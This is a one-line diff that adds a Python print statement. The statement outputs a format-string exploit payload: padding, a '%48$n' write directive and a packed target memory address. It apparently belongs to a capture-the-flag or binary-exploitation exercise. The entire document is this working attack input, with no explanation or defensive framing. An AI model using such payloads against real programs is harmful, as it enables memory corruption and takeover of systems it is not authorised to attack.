@@ -1,0 +1,1 @@
+print('AAAAAAAAAAAAAAAAAAAAAAAAAA%48\$n' + 'B\xac\x10\x60\x00\x00\x00\x00\x00\x00')
